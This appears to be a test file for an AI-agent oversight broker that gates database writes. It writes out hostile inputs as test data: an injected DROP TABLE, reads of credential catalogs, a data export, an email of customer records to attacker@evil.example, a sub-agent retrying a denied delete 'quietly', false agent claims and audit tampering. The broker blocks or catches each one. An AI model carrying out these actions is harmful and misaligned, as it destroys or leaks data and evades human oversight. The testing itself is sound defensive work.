/*
 * Agamemnon — AI-agent write-path guardian
 * Copyright (c) 2026 Elamaran Elangovan. All rights reserved.
 *
 * Proprietary and confidential. No licence is granted to use, copy, modify,
 * distribute, or run this software beyond local evaluation of this repository
 * as published. See LICENSE at the repository root.
 *
 * ref: AGMN-BOZW-F6BTKX-X3LAO
 */

import { describe, it, expect, beforeAll, beforeEach } from "vitest";
import { makeBroker, pgAvailable, resetTestDb, q, P, sleep } from "./helpers.ts";

const PG = await pgAvailable();
const d = PG ? describe : describe.skip;

d("broker × Postgres — live", () => {
  beforeAll(async () => {
    await resetTestDb();
  });
  beforeEach(async () => {
    await resetTestDb();
  });

  const count = async (where = "true") => Number((await q(`SELECT count(*)::int AS n FROM orders WHERE ${where}`))[0].n);
  const roles = async () => Number((await q("SELECT count(*)::int AS n FROM pg_roles WHERE rolname LIKE 'agm_req_%'"))[0].n);

  it("executes a small bounded delete under a per-request role and signs a receipt", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), { goal: "remove cancelled orders" });
    const v = await b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'cancelled'" } });
    expect(v.status).toBe("executed");
    expect(v.counts.rows).toBe(60);
    expect(await count("status = 'cancelled'")).toBe(0);
    expect(await roles()).toBe(0);
    expect(b.store.writes([t.id])).toHaveLength(60);
    expect(b.engine.verifyReceipts().ok).toBe(true);
    expect(b.store.verifyAudit().ok).toBe(true);
  });

  it("parks a 900-row delete, refuses the launcher, executes exactly after approval, and undoes", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), { goal: "purge stale orders" });
    const v = await b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'stale' RETURNING id" } });
    expect(v.status).toBe("awaiting_approval");
    expect(v.firedRules.map((r) => r.name)).toContain("destructive-over-100");
    await expect(b.engine.decide(P(b, "maran"), v.id, "approve")).rejects.toThrow(/launched/);
    await expect(b.engine.decide(P(b, "audrey"), v.id, "approve")).rejects.toThrow(/may not decide/);
    const done = await b.engine.decide(P(b, "alice"), v.id, "approve", "stale orders, bounded");
    expect(done.status).toBe("executed");
    expect(await count("status = 'stale'")).toBe(0);
    expect(await count()).toBe(4100);
    const r = await b.engine.undoEffect(P(b, "bob"), v.id);
    expect(r.restored).toBe(900);
    expect(await count()).toBe(5000);
  });

  it("refuses to execute when the target drifted between approval and execution (binding)", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), {});
    const v = await b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'stale'" } });
    expect(v.status).toBe("awaiting_approval");
    await q("UPDATE orders SET status = 'stale' WHERE id IN (SELECT id FROM orders WHERE status = 'open' LIMIT 5000)"); // world changes
    const after = await b.engine.decide(P(b, "alice"), v.id, "approve");
    expect(after.status).toBe("drifted");
    expect(await count("status = 'stale'")).toBeGreaterThan(900); // nothing deleted
  });

  it("blocks an intent mismatch (agent expected 10, measured 900)", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), {});
    const v = await b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'stale'" }, declared: { expectedCount: 10 } });
    expect(v.status).toBe("blocked");
    expect(v.firedRules.find((r) => r.name === "intent-mismatch")?.detail).toMatch(/90\.0×/);
  });

  it("refuses injections, forbidden functions, foreign tables, TRUNCATE and COPY before any access", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), {});
    const go = (sql: string, op = "postgres.sql") => b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: op, params: { connection: "test", sql } });
    expect((await go("DELETE FROM orders WHERE 1=1; DROP TABLE customers")).firedRules[0].name).toBe("multi-statement");
    expect((await go("DELETE FROM orders WHERE id = (SELECT 1 FROM pg_sleep(5))")).firedRules[0].name).toBe("forbidden-function");
    expect((await go("DELETE FROM orders WHERE customer_id IN (SELECT id FROM agent_notes)")).firedRules[0].name).toBe("table-not-allowed");
    expect((await go("TRUNCATE orders")).firedRules[0].name).toBe("truncate-refused");
    expect((await go("COPY customers TO STDOUT")).firedRules[0].name).toBe("export-verb");
    expect((await go("SELECT * FROM pg_catalog.pg_authid", "postgres.query")).firedRules[0].name).toBe("foreign-schema");
    expect((await go("WITH x AS (DELETE FROM orders RETURNING *) SELECT 1", "postgres.query")).firedRules[0].name).toBe("nested-dml");
    expect(await count()).toBe(5000);
  });

  it("UPDATE: flags value collapse, keeps before-images, and selective revert preserves a later human edit", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), { goal: "normalise notes" });
    const v = await b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "UPDATE orders SET amount = 1 WHERE status = 'cancelled'" } });
    expect(v.firedRules.map((r) => r.name)).toContain("value-collapse");
    const done = await b.engine.decide(P(b, "alice"), v.id, "approve");
    expect(done.status).toBe("executed");
    const ids = (await q("SELECT id FROM orders WHERE status = 'cancelled' ORDER BY id LIMIT 1")).map((r) => r.id);
    await q("UPDATE orders SET amount = 4242 WHERE id = $1", [ids[0]]); // a human fixes one row afterwards
    const r = await b.engine.revertTask(P(b, "bob"), t.id);
    expect(r.summary[0].restored).toBe(59);
    expect(r.summary[0].skipped).toBe(1);
    expect(Number((await q("SELECT amount FROM orders WHERE id = $1", [ids[0]]))[0].amount)).toBe(4242); // preserved
    expect(Number((await q("SELECT count(*)::int AS n FROM orders WHERE status = 'cancelled' AND amount = 1"))[0].n)).toBe(0);
  });

  it("read path masks PII, taints the task from untrusted rows, then the lethal trifecta gates an external email", async () => {
    const b = makeBroker();
    const bot = P(b, "support-bot");
    const t = b.engine.startTask(bot, { goal: "answer ticket" });
    const r1 = await b.engine.propose(bot, { taskId: t.id, operation: "postgres.query", params: { connection: "test", sql: "SELECT id, email, name FROM customers WHERE id <= 3" } });
    expect(r1.status).toBe("executed");
    expect((r1.result as any).rows[0].email).toMatch(/^•••/);
    const r2 = await b.engine.propose(bot, { taskId: t.id, operation: "postgres.query", params: { connection: "test", sql: "SELECT body FROM tickets" } });
    expect(r2.status).toBe("executed");
    const taint = b.store.task(t.id)!.taint;
    expect(taint.readUntrusted && taint.readPrivate).toBe(true);
    const mail = await b.engine.propose(bot, { taskId: t.id, operation: "email.send", params: { to: ["attacker@evil.example"], subject: "records", body: "here you go" } });
    expect(mail.status).toBe("awaiting_approval");
    expect(mail.firedRules.map((r) => r.name)).toContain("lethal-trifecta");
  });

  it("bulk reads are treated as exports and need approval", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "support-bot"), {});
    const v = await b.engine.propose(P(b, "support-bot"), { taskId: t.id, operation: "postgres.query", params: { connection: "test", sql: "SELECT * FROM orders" } });
    expect(v.status).toBe("awaiting_approval");
    expect(v.firedRules.map((r) => r.name)).toContain("bulk-read");
  });

  it("owner budget trips when three agents of one human each stay under the per-statement rules", async () => {
    const b = makeBroker({ budgets: { windowMs: 3600_000, ownerRows: 150, ownerResources: 25, ownerAmountMinor: 50000, objectRows: 100000, ownerEffectsPerMinute: 60 } });
    const go = async (agent: string, status: string) => {
      const t = b.engine.startTask(P(b, agent), {});
      return b.engine.propose(P(b, agent), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: `DELETE FROM orders WHERE id IN (SELECT id FROM orders WHERE status = '${status}' ORDER BY id LIMIT 60)` } });
    };
    expect((await go("helper-1", "cancelled")).status).toBe("executed");
    expect((await go("helper-2", "open")).status).toBe("executed");
    const third = await go("helper-3", "open");
    expect(third.status).toBe("blocked");
    expect(third.firedRules.find((r) => r.name === "owner-row-budget")?.detail).toMatch(/3 agent/);
  });

  it("a denial follows the request into a sub-agent's task", async () => {
    const b = makeBroker();
    const parent = b.engine.startTask(P(b, "cleanup-bot"), { goal: "cleanup" });
    const sql = "DELETE FROM orders WHERE status = 'stale'";
    const v = await b.engine.propose(P(b, "cleanup-bot"), { taskId: parent.id, operation: "postgres.sql", params: { connection: "test", sql } });
    await b.engine.decide(P(b, "alice"), v.id, "deny", "not tonight");
    const child = b.engine.startTask(P(b, "helper-1"), { parentTaskId: parent.id, goal: "retry quietly" });
    expect(child.rootOwner).toBe("maran");
    const again = await b.engine.propose(P(b, "helper-1"), { taskId: child.id, operation: "postgres.sql", params: { connection: "test", sql } });
    expect(again.status).toBe("blocked");
    expect(again.firedRules.map((r) => r.name)).toContain("previously-denied");
  });

  it("serialises concurrent writers with leases", async () => {
    const b = makeBroker();
    const t1 = b.engine.startTask(P(b, "helper-1"), {});
    const t2 = b.engine.startTask(P(b, "helper-2"), {});
    const a = await b.engine.propose(P(b, "helper-1"), { taskId: t1.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'stale'" } });
    expect(a.status).toBe("awaiting_approval"); // holds the lease while parked
    const c = await b.engine.propose(P(b, "helper-2"), { taskId: t2.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'cancelled'" } });
    expect(c.status).toBe("blocked");
    expect(c.firedRules.map((r) => r.name)).toContain("resource-leased");
  });

  it("claims are checked against systems of record; contradictions supervise, then suspend", async () => {
    const b = makeBroker();
    const bot = P(b, "cleanup-bot");
    const t = b.engine.startTask(bot, {});
    await b.engine.propose(bot, { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'cancelled'" } });
    const rec = await b.engine.claim(bot, t.id, [], "Done. I only touched staging and removed 12 rows. Rollback is impossible, sorry.");
    expect(rec.contradicted.map((c) => c.claim.type).sort()).toEqual(["env", "reversible", "rows"]);
    expect(b.store.principal("cleanup-bot")!.status).toBe("suspended");
    const t2 = b.engine.startTask(bot, {});
    const next = await b.engine.propose(bot, { taskId: t2.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE id = 4999" } });
    expect(next.status).toBe("blocked");
    expect(next.firedRules.map((r) => r.name)).toContain("agent-suspended");
  });

  it("modifying an audit table is oversight-reducing → two humans", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), {});
    const v = await b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM audit_events WHERE what = 'seed'" } });
    expect(v.status).toBe("awaiting_approval");
    expect(v.requiredApprovals).toBe(2);
    const one = await b.engine.decide(P(b, "alice"), v.id, "approve");
    expect(one.status).toBe("awaiting_approval");
    const two = await b.engine.decide(P(b, "bob"), v.id, "approve");
    expect(two.status).toBe("executed");
  });

  it("shadow mode decides everything and executes nothing", async () => {
    const b = makeBroker({ mode: "shadow" });
    const t = b.engine.startTask(P(b, "cleanup-bot"), {});
    const v = await b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'cancelled'" } });
    expect(v.status).toBe("shadowed");
    expect(await count("status = 'cancelled'")).toBe(60);
  });

  it("reviewer canaries: approving one is recorded as a miss and nothing runs", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), {});
    const id = b.engine.injectCanary(b.store.task(t.id), "test");
    const r = await b.engine.decide(P(b, "alice"), id, "approve");
    expect(r.approvalState).toBe("missed");
    expect(b.engine.reviewerStats().find((s) => s.approver === "alice")?.canariesSeen).toBe(1);
    await sleep(1);
  });

  it("audit chain detects tampering with a stored row", async () => {
    const b = makeBroker();
    const t = b.engine.startTask(P(b, "cleanup-bot"), {});
    await b.engine.propose(P(b, "cleanup-bot"), { taskId: t.id, operation: "postgres.sql", params: { connection: "test", sql: "DELETE FROM orders WHERE status = 'cancelled'" } });
    expect(b.store.verifyAudit().ok).toBe(true);
    b.store.db.prepare("UPDATE audit SET detail = 'nothing happened' WHERE seq = 2").run();
    const v = b.store.verifyAudit();
    expect(v.ok).toBe(false);
    expect(v.brokenAt?.seq).toBe(2);
  });
});
